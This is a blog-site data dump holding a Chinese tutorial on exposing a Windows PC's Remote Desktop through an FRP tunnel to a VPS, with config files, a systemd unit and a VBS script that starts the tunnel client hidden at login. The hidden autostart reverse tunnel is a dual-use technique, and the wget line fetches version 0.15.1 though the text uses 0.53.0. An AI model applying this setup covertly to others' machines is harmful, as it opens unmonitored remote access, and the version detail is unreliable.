class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>验证安装</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fping -v</span><br></pre></td></tr></table></figure>"},{"title":"FRP实现 Windows 远程桌面","date":"2024-01-14T13:18:49.000Z","_content":"\n最近入手了一台VPS，针对VPS进行了一些功能探索。所以此教程是需要基于一台VPS的。类似于向日葵和 To Desk 的远程桌面，只不过 FRP 实现的远程桌面不需要你再去记住远程软件提供的控制码。\n\n<!-- more -->\n\n### 啰嗦几句\n\nFRP 的安装分为服务器端和客户端。服务器端需要在 VPS 上安装，客户端需要在本地安装（也就是需要被远程连接的机器）。\n\n此项目也是Github上的项目，[项目链接 https://github.com/fatedier/frp](https://github.com/fatedier/frp)\n\n### 服务器端安装 FRP\n\n直接使用下面的命令\n\n```bash\nwget https://github.com/fatedier/frp/releases/download/v0.15.1/frp_0.15.1_linux_amd64.tar.gz\n```\n下载好后压缩包后解压，会得到以下几个文件\n\n![文件展示](./frp/1.png)\n\n* frpc 是客户端运行的可执行文件，VPS这里不需要理它。\n* frpc.toml 是客户端的配置文件，VPS这里不需要理它。\n* frps 是服务端运行的可执行文件，VPS要用\n* frps.toml 是服务端的配置文件，VPS要用。\n\n### 修改服务端配置文件frps.toml\n\n```toml\nbindPort = 7000\n```\n\n![服务端配置文件](./frp/4.png)]\n\n修改后运行如下命令启动服务：\n\n```bash\nfrps -c ./frps.toml\n```\n\n运行后，会有输出内容，这是问题就出现了，不能<kbd>Ctrl</kbd> + <kbd>C</kbd>停止掉，这就造成当前运行服务后不能进行其他操作了。所以需要把服务做成后台服务，这样就可以在前台进行其他操作了。\n\n如果访问Github有困难的话，可以去百度网盘下载，我使用的是0.53.0版本，提供的也是0.53.0版本。[**服务器端百度网盘链接，点击跳转，**](https://pan.baidu.com/s/1eTxV0C_ApwfWivirMB6zIg?pwd=wzns) 提取码：wzns\n\n### 使用 systemctl 管理 FRP 服务\n\n首先放一个官方链接，[**点击跳转。**](https://gofrp.org/zh-cn/docs/setup/systemd/)\n\n1. 安装 systemd\n\n如果您的 Linux 服务器上尚未安装 systemd，可以使用包管理器如 yum（适用于 CentOS/RHEL）或 apt（适用于 Debian/Ubuntu）来安装它：\n\n```bash\n# 使用 yum 安装 systemd（CentOS/RHEL）\nyum install systemd\n\n# 使用 apt 安装 systemd（Debian/Ubuntu）\napt install systemd\n```\n\n2.创建 frps.service 文件\n\n使用文本编辑器 (如 vim) 在 /etc/systemd/system 目录下创建一个 frps.service 文件，用于配置 frps 服务。\n\n```bash\nsudo vim /etc/systemd/system/frps.service\n```\n\n3. 写入内容\n\n```bash\n[Unit]\n# 服务名称，可自定义\nDescription = frp server\nAfter = network.target syslog.target\nWants = network.target\n\n[Service]\nType = simple\n# 启动frps的命令，需修改为您的frps的安装路径\nExecStart = /path/to/frps -c /path/to/frps.toml\n\n[Install]\nWantedBy = multi-user.target\n```\n\n4. 然后就可以像管理其他服务一样，使用systemctl命令来管理frps了。\n\n```bash\n# 启动frp\nsudo systemctl start frps\n# 停止frp\nsudo systemctl stop frps\n# 重启frp\nsudo systemctl restart frps\n# 查看frp状态\nsudo systemctl status frps\n```\n\n### 客户端（Windows）安装FRP\n\n[0.53.0官方Windows下载链接，点击下载](https://github.com/fatedier/frp/releases/download/v0.53.0/frp_0.53.0_windows_amd64.zip)   \n同样的，访问Github有困难的话，可以使用百度网盘下载，[**客户端百度网盘链接，点击跳转**](https://pan.baidu.com/s/11-wDw4l_augPWeAf9OcTGA?pwd=kstm) 提取码：kstm\n\n### 客户端配置文件修改\n\n下载解压后，除了你们没有如图所示的第一个文件外，其他应该都一样。\n\n![客户端文件展示](./frp/2.png)\n\n```toml\nserverAddr = \"123.56.10.1\"  # 服务器地址，填写自己真实的VPS地址\nserverPort = 7000           # 服务器端口，与服务端配置的端口一致\n\n[[proxies]]\nname = \"HP-desktop\"         # 备注，随便写\ntype = \"tcp\"                # 类型，不要变\nlocalIP = \"127.0.0.1\"       # 不要变\nlocalPort = 3389            # 本地端口，不要变\nremotePort = 10086          # 远程端口，自己设，比如设置为10086，以后访问这台Windows就是输入123.56.10.1:10086。\n```\n\n使用起来是和服务器端一样的，只不过这次需要运行客户端的文件。在当前目录鼠标右击打开CMD，然后如图所示运行（一定要看清楚运行的是 **frpc** 的文件）。\n\n![客户端文件展示](./frp/3.png)\n\n### 设置Windows无窗口启动\n\n这也就是为什么我会多出来一个.vbs文件。话不多说，放码出去。\n\n```vbs\nSet WShell = CreateObject(\"WScript.Shell\")\ncommand = \"frpc.exe\"\narguments = \"-c frpc.toml\"\nfullCommand = command & \" \" & arguments\nWShell.Run fullCommand, 0, False\nSet WShell = Nothing\n```\n\n想启动服务直接双击这个.vbs文件即可，如果想达到开机自启动，可以将这个.vbs文件放到开机计划中。\n\n1. 首先创建好快捷方式。\n2. <kbd>Win</kbd>+<kbd>R</kbd>输入`shell:startup`，直接回车。\n3. 将快捷方式放入这个文件夹中，大功告成。\n\n### 测试\n\n<kbd>Win</kbd>+<kbd>Q</kbd>搜索“远程桌面连接”，输入IP以及端口号，如果没毛病的话，就是如下的效果。如果有什么问题，可以评论区留言。\n\n![客户端文件展示](./frp/5.png)\n\n最后输入被控电脑的用户名和密码进行登录。\n\n---\n---\n\n### 易错点\n\n1. 以上面的教程为例，VPS 是需要打开 7000 端口和 10086 端口的，放行这两个端口，否则无法连接。\n\n2. Windows 家庭版无法使用远程桌面，要么重新安装 Windows 专业版，要么使用专业版激活码重新激活。","source":"_posts/frp.md","raw":"---\ntitle: FRP实现 Windows 远程桌面\ndate: 2024-01-14 21:18:49\ncategories: 小玩意儿\ntags:\n  - Windows\n  - Linux\n---\n\n最近入手了一台VPS，针对VPS进行了一些功能探索。所以此教程是需要基于一台VPS的。类似于向日葵和 To Desk 的远程桌面，只不过 FRP 实现的远程桌面不需要你再去记住远程软件提供的控制码。\n\n<!-- more -->\n\n### 啰嗦几句\n\nFRP 的安装分为服务器端和客户端。服务器端需要在 VPS 上安装，客户端需要在本地安装（也就是需要被远程连接的机器）。\n\n此项目也是Github上的项目，[项目链接 https://github.com/fatedier/frp](https://github.com/fatedier/frp)\n\n### 服务器端安装 FRP\n\n直接使用下面的命令\n\n```bash\nwget https://github.com/fatedier/frp/releases/download/v0.15.1/frp_0.15.1_linux_amd64.tar.gz\n```\n下载好后压缩包后解压，会得到以下几个文件\n\n![文件展示](./frp/1.png)\n\n* frpc 是客户端运行的可执行文件，VPS这里不需要理它。\n* frpc.toml 是客户端的配置文件，VPS这里不需要理它。\n* frps 是服务端运行的可执行文件，VPS要用\n* frps.toml 是服务端的配置文件，VPS要用。\n\n### 修改服务端配置文件frps.toml\n\n```toml\nbindPort = 7000\n```\n\n![服务端配置文件](./frp/4.png)]\n\n修改后运行如下命令启动服务：\n\n```bash\nfrps -c ./frps.toml\n```\n\n运行后，会有输出内容，这是问题就出现了，不能<kbd>Ctrl</kbd> + <kbd>C</kbd>停止掉，这就造成当前运行服务后不能进行其他操作了。所以需要把服务做成后台服务，这样就可以在前台进行其他操作了。\n\n如果访问Github有困难的话，可以去百度网盘下载，我使用的是0.53.0版本，提供的也是0.53.0版本。[**服务器端百度网盘链接，点击跳转，**](https://pan.baidu.com/s/1eTxV0C_ApwfWivirMB6zIg?pwd=wzns) 提取码：wzns\n\n### 使用 systemctl 管理 FRP 服务\n\n首先放一个官方链接，[**点击跳转。**](https://gofrp.org/zh-cn/docs/setup/systemd/)\n\n1. 安装 systemd\n\n如果您的 Linux 服务器上尚未安装 systemd，可以使用包管理器如 yum（适用于 CentOS/RHEL）或 apt（适用于 Debian/Ubuntu）来安装它：\n\n```bash\n# 使用 yum 安装 systemd（CentOS/RHEL）\nyum install systemd\n\n# 使用 apt 安装 systemd（Debian/Ubuntu）\napt install systemd\n```\n\n2.创建 frps.service 文件\n\n使用文本编辑器 (如 vim) 在 /etc/systemd/system 目录下创建一个 frps.service 文件，用于配置 frps 服务。\n\n```bash\nsudo vim /etc/systemd/system/frps.service\n```\n\n3. 写入内容\n\n```bash\n[Unit]\n# 服务名称，可自定义\nDescription = frp server\nAfter = network.target syslog.target\nWants = network.target\n\n[Service]\nType = simple\n# 启动frps的命令，需修改为您的frps的安装路径\nExecStart = /path/to/frps -c /path/to/frps.toml\n\n[Install]\nWantedBy = multi-user.target\n```\n\n4. 然后就可以像管理其他服务一样，使用systemctl命令来管理frps了。\n\n```bash\n# 启动frp\nsudo systemctl start frps\n# 停止frp\nsudo systemctl stop frps\n# 重启frp\nsudo systemctl restart frps\n# 查看frp状态\nsudo systemctl status frps\n```\n\n### 客户端（Windows）安装FRP\n\n[0.53.0官方Windows下载链接，点击下载](https://github.com/fatedier/frp/releases/download/v0.53.0/frp_0.53.0_windows_amd64.zip)   \n同样的，访问Github有困难的话，可以使用百度网盘下载，[**客户端百度网盘链接，点击跳转**](https://pan.baidu.com/s/11-wDw4l_augPWeAf9OcTGA?pwd=kstm) 提取码：kstm\n\n### 客户端配置文件修改\n\n下载解压后，除了你们没有如图所示的第一个文件外，其他应该都一样。\n\n![客户端文件展示](./frp/2.png)\n\n```toml\nserverAddr = \"123.56.10.1\"  # 服务器地址，填写自己真实的VPS地址\nserverPort = 7000           # 服务器端口，与服务端配置的端口一致\n\n[[proxies]]\nname = \"HP-desktop\"         # 备注，随便写\ntype = \"tcp\"                # 类型，不要变\nlocalIP = \"127.0.0.1\"       # 不要变\nlocalPort = 3389            # 本地端口，不要变\nremotePort = 10086          # 远程端口，自己设，比如设置为10086，以后访问这台Windows就是输入123.56.10.1:10086。\n```\n\n使用起来是和服务器端一样的，只不过这次需要运行客户端的文件。在当前目录鼠标右击打开CMD，然后如图所示运行（一定要看清楚运行的是 **frpc** 的文件）。\n\n![客户端文件展示](./frp/3.png)\n\n### 设置Windows无窗口启动\n\n这也就是为什么我会多出来一个.vbs文件。话不多说，放码出去。\n\n```vbs\nSet WShell = CreateObject(\"WScript.Shell\")\ncommand = \"frpc.exe\"\narguments = \"-c frpc.toml\"\nfullCommand = command & \" \" & arguments\nWShell.Run fullCommand, 0, False\nSet WShell = Nothing\n```\n\n想启动服务直接双击这个.vbs文件即可，如果想达到开机自启动，可以将这个.vbs文件放到开机计划中。\n\n1. 首先创建好快捷方式。\n2. <kbd>Win</kbd>+<kbd>R</kbd>输入`shell:startup`，直接回车。\n3. 将快捷方式放入这个文件夹中，大功告成。\n\n### 测试\n\n<kbd>Win</kbd>+<kbd>Q</kbd>搜索“远程桌面连接”，输入IP以及端口号，如果没毛病的话，就是如下的效果。如果有什么问题，可以评论区留言。\n\n![客户端文件展示](./frp/5.png)\n\n最后输入被控电脑的用户名和密码进行登录。\n\n---\n---\n\n### 易错点\n\n1. 以上面的教程为例，VPS 是需要打开 7000 端口和 10086 端口的，放行这两个端口，否则无法连接。\n\n2. Windows 家庭版无法使用远程桌面，要么重新安装 Windows 专业版，要么使用专业版激活码重新激活。","slug":"frp","published":1,"updated":"2024-05-03T03:55:54.849Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fg005c7zj397zdebz2","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>最近入手了一台VPS，针对VPS进行了一些功能探索。所以此教程是需要基于一台VPS的。类似于向日葵和 To Desk 的远程桌面，只不过 FRP 实现的远程桌面不需要你再去记住远程软件提供的控制码。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"啰嗦几句\"><a href=\"#啰嗦几句\" class=\"headerlink\" title=\"啰嗦几句\"></a>啰嗦几句</h3><p>FRP 的安装分为服务器端和客户端。服务器端需要在 VPS 上安装，客户端需要在本地安装（也就是需要被远程连接的机器）。</p>\n<p>此项目也是Github上的项目，<a href=\"https://github.com/fatedier/frp\">项目链接 https://github.com/fatedier/frp</a></p>\n<h3 id=\"服务器端安装-FRP\"><a href=\"#服务器端安装-FRP\" class=\"headerlink\" title=\"服务器端安装 FRP\"></a>服务器端安装 FRP</h3><p>直接使用下面的命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/fatedier/frp/releases/download/v0.15.1/frp_0.15.1_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure>\n<p>下载好后压缩包后解压，会得到以下几个文件</p>\n<p><img src=\"/2024/01/14/frp/1.png\" alt=\"文件展示\"></p>\n<ul>\n<li>frpc 是客户端运行的可执行文件，VPS这里不需要理它。</li>\n<li>frpc.toml 是客户端的配置文件，VPS这里不需要理它。</li>\n<li>frps 是服务端运行的可执行文件，VPS要用</li>\n<li>frps.toml 是服务端的配置文件，VPS要用。</li>\n</ul>\n<h3 id=\"修改服务端配置文件frps-toml\"><a href=\"#修改服务端配置文件frps-toml\" class=\"headerlink\" title=\"修改服务端配置文件frps.toml\"></a>修改服务端配置文件frps.toml</h3><figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">bindPort</span> = <span class=\"number\">7000</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/01/14/frp/4.png\" alt=\"服务端配置文件\">]</p>\n<p>修改后运行如下命令启动服务：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frps -c ./frps.toml</span><br></pre></td></tr></table></figure>\n\n<p>运行后，会有输出内容，这是问题就出现了，不能<kbd>Ctrl</kbd> + <kbd>C</kbd>停止掉，这就造成当前运行服务后不能进行其他操作了。所以需要把服务做成后台服务，这样就可以在前台进行其他操作了。</p>\n<p>如果访问Github有困难的话，可以去百度网盘下载，我使用的是0.53.0版本，提供的也是0.53.0版本。<a href=\"https://pan.baidu.com/s/1eTxV0C_ApwfWivirMB6zIg?pwd=wzns\"><strong>服务器端百度网盘链接，点击跳转，</strong></a> 提取码：wzns</p>\n<h3 id=\"使用-systemctl-管理-FRP-服务\"><a href=\"#使用-systemctl-管理-FRP-服务\" class=\"headerlink\" title=\"使用 systemctl 管理 FRP 服务\"></a>使用 systemctl 管理 FRP 服务</h3><p>首先放一个官方链接，<a href=\"https://gofrp.org/zh-cn/docs/setup/systemd/\"><strong>点击跳转。</strong></a></p>\n<ol>\n<li>安装 systemd</li>\n</ol>\n<p>如果您的 Linux 服务器上尚未安装 systemd，可以使用包管理器如 yum（适用于 CentOS&#x2F;RHEL）或 apt（适用于 Debian&#x2F;Ubuntu）来安装它：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 使用 yum 安装 systemd（CentOS/RHEL）</span></span><br><span class=\"line\">yum install systemd</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 apt 安装 systemd（Debian/Ubuntu）</span></span><br><span class=\"line\">apt install systemd</span><br></pre></td></tr></table></figure>\n\n<p>2.创建 frps.service 文件</p>\n<p>使用文本编辑器 (如 vim) 在 &#x2F;etc&#x2F;systemd&#x2F;system 目录下创建一个 frps.service 文件，用于配置 frps 服务。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/systemd/system/frps.service</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>写入内容</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\"><span class=\"comment\"># 服务名称，可自定义</span></span><br><span class=\"line\">Description = frp server</span><br><span class=\"line\">After = network.target syslog.target</span><br><span class=\"line\">Wants = network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type = simple</span><br><span class=\"line\"><span class=\"comment\"># 启动frps的命令，需修改为您的frps的安装路径</span></span><br><span class=\"line\">ExecStart = /path/to/frps -c /path/to/frps.toml</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy = multi-user.target</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>然后就可以像管理其他服务一样，使用systemctl命令来管理frps了。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 启动frp</span></span><br><span class=\"line\">sudo systemctl start frps</span><br><span class=\"line\"><span class=\"comment\"># 停止frp</span></span><br><span class=\"line\">sudo systemctl stop frps</span><br><span class=\"line\"><span class=\"comment\"># 重启frp</span></span><br><span class=\"line\">sudo systemctl restart frps</span><br><span class=\"line\"><span class=\"comment\"># 查看frp状态</span></span><br><span class=\"line\">sudo systemctl status frps</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"客户端（Windows）安装FRP\"><a href=\"#客户端（Windows）安装FRP\" class=\"headerlink\" title=\"客户端（Windows）安装FRP\"></a>客户端（Windows）安装FRP</h3><p><a href=\"https://github.com/fatedier/frp/releases/download/v0.53.0/frp_0.53.0_windows_amd64.zip\">0.53.0官方Windows下载链接，点击下载</a><br>同样的，访问Github有困难的话，可以使用百度网盘下载，<a href=\"https://pan.baidu.com/s/11-wDw4l_augPWeAf9OcTGA?pwd=kstm\"><strong>客户端百度网盘链接，点击跳转</strong></a> 提取码：kstm</p>\n<h3 id=\"客户端配置文件修改\"><a href=\"#客户端配置文件修改\" class=\"headerlink\" title=\"客户端配置文件修改\"></a>客户端配置文件修改</h3><p>下载解压后，除了你们没有如图所示的第一个文件外，其他应该都一样。</p>\n<p><img src=\"/2024/01/14/frp/2.png\" alt=\"客户端文件展示\"></p>\n<figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">serverAddr</span> = <span class=\"string\">&quot;123.56.10.1&quot;</span>  <span class=\"comment\"># 服务器地址，填写自己真实的VPS地址</span></span><br><span class=\"line\"><span class=\"attr\">serverPort</span> = <span class=\"number\">7000</span>           <span class=\"comment\"># 服务器端口，与服务端配置的端口一致</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[[proxies]]</span></span><br><span class=\"line\"><span class=\"attr\">name</span> = <span class=\"string\">&quot;HP-desktop&quot;</span>         <span class=\"comment\"># 备注，随便写</span></span><br><span class=\"line\"><span class=\"attr\">type</span> = <span class=\"string\">&quot;tcp&quot;</span>                <span class=\"comment\"># 类型，不要变</span></span><br><span class=\"line\"><span class=\"attr\">localIP</span> = <span class=\"string\">&quot;127.0.0.1&quot;</span>       <span class=\"comment\"># 不要变</span></span><br><span class=\"line\"><span class=\"attr\">localPort</span> = <span class=\"number\">3389</span>            <span class=\"comment\"># 本地端口，不要变</span></span><br><span class=\"line\"><span class=\"attr\">remotePort</span> = <span class=\"number\">10086</span>          <span class=\"comment\"># 远程端口，自己设，比如设置为10086，以后访问这台Windows就是输入123.56.10.1:10086。</span></span><br></pre></td></tr></table></figure>\n\n<p>使用起来是和服务器端一样的，只不过这次需要运行客户端的文件。在当前目录鼠标右击打开CMD，然后如图所示运行（一定要看清楚运行的是 <strong>frpc</strong> 的文件）。</p>\n<p><img src=\"/2024/01/14/frp/3.png\" alt=\"客户端文件展示\"></p>\n<h3 id=\"设置Windows无窗口启动\"><a href=\"#设置Windows无窗口启动\" class=\"headerlink\" title=\"设置Windows无窗口启动\"></a>设置Windows无窗口启动</h3><p>这也就是为什么我会多出来一个.vbs文件。话不多说，放码出去。</p>\n<figure class=\"highlight vbs\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">Set</span> WShell = <span class=\"built_in\">CreateObject</span>(<span class=\"string\">&quot;WScript.Shell&quot;</span>)</span><br><span class=\"line\">command = <span class=\"string\">&quot;frpc.exe&quot;</span></span><br><span class=\"line\">arguments = <span class=\"string\">&quot;-c frpc.toml&quot;</span></span><br><span class=\"line\">fullCommand = command &amp; <span class=\"string\">&quot; &quot;</span> &amp; arguments</span><br><span class=\"line\">WShell.Run fullCommand, <span class=\"number\">0</span>, <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"keyword\">Set</span> WShell = <span class=\"literal\">Nothing</span></span><br></pre></td></tr></table></figure>\n\n<p>想启动服务直接双击这个.vbs文件即可，如果想达到开机自启动，可以将这个.vbs文件放到开机计划中。</p>\n<ol>\n<li>首先创建好快捷方式。</li>\n<li><kbd>Win</kbd>+<kbd>R</kbd>输入<code>shell:startup</code>，直接回车。</li>\n<li>将快捷方式放入这个文件夹中，大功告成。</li>\n</ol>\n<h3 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h3><p><kbd>Win</kbd>+<kbd>Q</kbd>搜索“远程桌面连接”，输入IP以及端口号，如果没毛病的话，就是如下的效果。如果有什么问题，可以评论区留言。</p>\n<p><img src=\"/2024/01/14/frp/5.png\" alt=\"客户端文件展示\"></p>\n<p>最后输入被控电脑的用户名和密码进行登录。</p>\n<hr>\n<hr>\n<h3 id=\"易错点\"><a href=\"#易错点\" class=\"headerlink\" title=\"易错点\"></a>易错点</h3><ol>\n<li><p>以上面的教程为例，VPS 是需要打开 7000 端口和 10086 端口的，放行这两个端口，否则无法连接。</p>\n</li>\n<li><p>Windows 家庭版无法使用远程桌面，要么重新安装 Windows 专业版，要么使用专业版激活码重新激活。</p>\n</li>\n</ol>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>最近入手了一台VPS，针对VPS进行了一些功能探索。所以此教程是需要基于一台VPS的。类似于向日葵和 To Desk 的远程桌面，只不过 FRP 实现的远程桌面不需要你再去记住远程软件提供的控制码。</p>","more":"<h3 id=\"啰嗦几句\"><a href=\"#啰嗦几句\" class=\"headerlink\" title=\"啰嗦几句\"></a>啰嗦几句</h3><p>FRP 的安装分为服务器端和客户端。服务器端需要在 VPS 上安装，客户端需要在本地安装（也就是需要被远程连接的机器）。</p>\n<p>此项目也是Github上的项目，<a href=\"https://github.com/fatedier/frp\">项目链接 https://github.com/fatedier/frp</a></p>\n<h3 id=\"服务器端安装-FRP\"><a href=\"#服务器端安装-FRP\" class=\"headerlink\" title=\"服务器端安装 FRP\"></a>服务器端安装 FRP</h3><p>直接使用下面的命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/fatedier/frp/releases/download/v0.15.1/frp_0.15.1_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure>\n<p>下载好后压缩包后解压，会得到以下几个文件</p>\n<p><img src=\"/2024/01/14/frp/1.png\" alt=\"文件展示\"></p>\n<ul>\n<li>frpc 是客户端运行的可执行文件，VPS这里不需要理它。</li>\n<li>frpc.toml 是客户端的配置文件，VPS这里不需要理它。</li>\n<li>frps 是服务端运行的可执行文件，VPS要用</li>\n<li>frps.toml 是服务端的配置文件，VPS要用。</li>\n</ul>\n<h3 id=\"修改服务端配置文件frps-toml\"><a href=\"#修改服务端配置文件frps-toml\" class=\"headerlink\" title=\"修改服务端配置文件frps.toml\"></a>修改服务端配置文件frps.toml</h3><figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">bindPort</span> = <span class=\"number\">7000</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/01/14/frp/4.png\" alt=\"服务端配置文件\">]</p>\n<p>修改后运行如下命令启动服务：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frps -c ./frps.toml</span><br></pre></td></tr></table></figure>\n\n<p>运行后，会有输出内容，这是问题就出现了，不能<kbd>Ctrl</kbd> + <kbd>C</kbd>停止掉，这就造成当前运行服务后不能进行其他操作了。所以需要把服务做成后台服务，这样就可以在前台进行其他操作了。</p>\n<p>如果访问Github有困难的话，可以去百度网盘下载，我使用的是0.53.0版本，提供的也是0.53.0版本。<a href=\"https://pan.baidu.com/s/1eTxV0C_ApwfWivirMB6zIg?pwd=wzns\"><strong>服务器端百度网盘链接，点击跳转，</strong></a> 提取码：wzns</p>\n<h3 id=\"使用-systemctl-管理-FRP-服务\"><a href=\"#使用-systemctl-管理-FRP-服务\" class=\"headerlink\" title=\"使用 systemctl 管理 FRP 服务\"></a>使用 systemctl 管理 FRP 服务</h3><p>首先放一个官方链接，<a 